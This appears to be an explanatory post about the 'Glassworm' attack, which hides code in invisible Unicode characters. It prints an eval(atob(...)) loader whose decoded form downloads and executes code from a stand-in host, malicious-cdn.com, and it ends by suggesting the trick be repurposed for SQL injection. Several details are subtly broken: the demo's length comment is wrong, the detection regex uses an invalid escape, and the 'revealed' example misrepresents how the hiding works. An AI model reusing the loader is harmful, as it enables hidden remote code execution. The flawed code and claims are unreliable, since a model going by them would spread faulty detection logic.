This is how this invisible malicious code attack works:

What a Developer Sees (Innocent-looking code):
```
function updateConfig() {
  const config = {
    version: "2.1.0",
    debug: false,
    apiEndpoint: "https://api.example.com"
  };
  return config;
}
```

What's ACTUALLY in the code (Hidden characters revealed):
```
function updateConfig() {
  const config = {
    version: "2.1.0",​⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀eval(atob('dmFyIHggPSBuZXcgWG1sSHR0cFJlcXVlc3QoKTsKeC5vcGVuKCJHRVQiLCAiaHR0cHM6Ly9tYWxpY2lvdXMtY2RuLmNvbS9wYXlsb2FkIik7Cnguc2VuZCgpOwpldmFsKHgucmVzcG9uc2VUZXh0KTs='))
    debug: false,
    apiEndpoint: "https://api.example.com"
  };
  return config;
}
```

Decoded Payload:

```
var x = new XmlHttpRequest();
x.open("GET", "https://malicious-cdn.com/payload");
x.send();
eval(x.responseText);
```

1. Creates an HTTP request to fetch more malicious code from https://malicious-cdn.com/payload

2. Downloads that code

3. Executes it immediately using eval()

```
Stage 1: Small, hidden payload (the invisible characters)

Stage 2: Downloads the real malware from a remote server

Stage 3: Full system compromise
```

The attacker uses this two-stage approach because:
- The initial payload is tiny and easy to hide
- They can update the remote payload without re-infecting repos
- It's harder to detect the full malicious code during code review

In the Glassworm attack, that downloaded payload would then:
- Connect to Solana blockchain for commands
- Steal credentials, tokens, and secrets
- Install backdoors (VNC servers, SOCKS proxies)

### How it Works:
1. The Hidden Part: Between "2.1.0", and debug: false, there are actually invisible Unicode characters (Zero-width spaces and private use characters) that contain malicious code.

2. What it Does: Those invisible characters contain a payload that:
- Decodes a hidden script
- Fetches additional malware from a remote server
- Uses Solana blockchain for command-and-control
- Steals credentials, tokens, and secrets from the developer's machine

3. Why It's Dangerous:
- You can't see it in any code editor (VS Code, etc.)
- Pull requests look legitimate
- The attackers use AI to make the commit messages look like normal version bumps or refactors
- Once merged, it compromises everyone who uses that code

This is exactly how the Glassworm attack compromised 151 GitHub repositories - by hiding malicious code in characters that are completely invisible to human reviewers.

[!Ref](https://www.tomshardware.com/tech-industry/cyber-security/malicious-packages-using-invisible-unicode-found-in-151-github-repos-and-vs-code)

### You still cannot see these invisible characters in most editors.

What you see when highlighting normal text:

```
function updateConfig() {⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀return config; }
```

What's ACTUALLY there (invisible chars revealed):

```
function updateConfig() {​󠄀󠄁󠄂󠄃󠄄󠄅󠄆󠄇󠄈󠄉󠄊󠄋󠄌󠄍󠄎󠄏return config; }
```

Those "⠀⠀" are actually invisible Unicode characters


```
# Create invisible characters that even highlighting won't reveal
invisible_chars = {
    'zero_width_space': '\u200B',           # Zero-width space
    'zero_width_joiner': '\u200D',           # Zero-width joiner  
    'variation_selector_1': '\uFE00',        # VS1 (invisible)
    'variation_selector_16': '\uFE0F',       # VS16 (invisible)
}

# Hide a message between visible text
hidden_message = "Hello" + '\u200B' * 10 + "World"
print(f"Hidden text: '{hidden_message}'")
print(f"Length: {len(hidden_message)} characters")  # Shows 15, not 5!

# Try to see it - you can't!
print("\nTry highlighting this line - you won't see the hidden chars:")
print("NORMAL TEXT🔴HIDDEN🔴NORMAL")
print("           ^ Look for red dots - there are none!")

# Detection is the only way
import re
def find_invisible(text):
    invisible_pattern = re.compile(r'[\u200B-\u200D\uFE00-\uFE0F\uE0100-\uE01EF]')
    matches = invisible_pattern.findall(text)
    return len(matches)

text = "Normal" + '\u200B' + "Normal"
print(f"\nInvisible chars found: {find_invisible(text)}")  # Shows 1
```

Highlighting the text doesn't work:
- Zero-width characters have no visual representation
- Variation selectors modify the previous character but don't show
- Private Use Area characters often render as nothing
- Most fonts have no glyphs for these code points

The Glassworm attack is so dangerous - you literally cannot see the malicious code, even when you're looking right at it. 


# SQL injection
This technique can be repurposed to hide SQL injection payloads! The core concept is hiding malicious code within invisible Unicode characters, which works for any text-based injection, including SQL.

